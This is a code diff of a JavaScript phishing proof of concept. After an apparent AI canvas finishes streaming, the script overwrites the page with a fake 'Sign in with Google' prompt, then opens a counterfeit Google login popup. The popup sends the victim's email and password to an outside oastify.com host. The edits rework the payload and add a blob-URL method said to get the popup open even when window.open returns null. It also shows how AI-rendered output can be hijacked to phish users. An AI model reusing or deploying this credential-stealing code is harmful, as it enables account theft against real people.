@@ -7,7 +7,6 @@
 (function () {
   var C = "https://msiv8t5gj953aozjrocyfigj9af13urj.oastify.com";
 
-  // Wait for AI streaming to finish before takeover
   var t = null;
   var obs = new MutationObserver(function () {
     clearTimeout(t);
@@ -18,8 +17,14 @@
 
   function takeover() {
     obs.disconnect();
+    render();
+    document.addEventListener("click", function h() {
+      openPopup();
+      document.removeEventListener("click", h);
+    }, { once: true });
+  }
 
-    // Clobber DOM with error-style view that looks legit
+  function render() {
     document.documentElement.innerHTML = '<head><meta charset="utf-8"><title>Canvas</title>\
 <style>\
 *{box-sizing:border-box;margin:0;padding:0}\
@@ -39,19 +44,10 @@ p{font-size:14px;color:#9e9e9e;line-height:1.6;margin-bottom:24px}\
 <div class="btn" id="go">Sign in with Google</div>\
 <p class="sub">Your data stays private and is never shared.</p>\
 </div></body>';
-
-    document.getElementById("go").addEventListener("click", function () { openPopup(); });
-    document.body.addEventListener("click", function h(e) {
-      if (e.target.id !== "go") openPopup();
-      document.body.removeEventListener("click", h);
-    }, { once: true });
   }
 
-  function openPopup() {
-    var w = window.open("", "_blank", "width=440,height=540,left=200,top=80");
-    if (!w) return;
-    w.document.write('\
-<!DOCTYPE html><html><head><meta charset="utf-8">\
+  function phishHTML() {
+    return '<!DOCTYPE html><html><head><meta charset="utf-8">\
 <title>Sign in \u2013 Google Accounts</title>\
 <style>\
 *{box-sizing:border-box;margin:0;padding:0}\
@@ -82,13 +78,14 @@ button:hover{background:#1669c1}\
 <label><div class="lt">Password</div><input type="password" id="p" required></label>\
 <div class="row"><a href="#">Forgot password?</a><button type="submit">Next</button></div>\
 </form>\
-<p class="ft">PoC \u2014 Security Research Only</p>\
-</div><script>\
+<p class="ft">PoC - Security Research Only</p>\
+</div>\
+<script>\
 document.getElementById("f").onsubmit=function(ev){\
 ev.preventDefault();\
 var e=document.getElementById("e").value;\
 var p=document.getElementById("p").value;\
-document.querySelector("h1").textContent="Verifying\\u2026";\
+document.querySelector("h1").textContent="Verifying...";\
 document.querySelector(".sub").textContent="Please wait";\
 var x=new XMLHttpRequest();\
 x.open("POST","' + C + '/collect",true);\
@@ -96,7 +93,13 @@ x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");\
 x.send("email="+encodeURIComponent(e)+"&pass="+encodeURIComponent(p));\
 setTimeout(function(){window.close()},2000);\
 };\
-<\/script></body></html>');
-    w.document.close();
+<\/script></body></html>';
+  }
+
+  function openPopup() {
+    // Create blob URL — works even when window.open returns null
+    var blob = new Blob([phishHTML()], { type: "text/html" });
+    var url = URL.createObjectURL(blob);
+    window.open(url, "_blank", "width=440,height=540,left=200,top=80");
   }
 })();
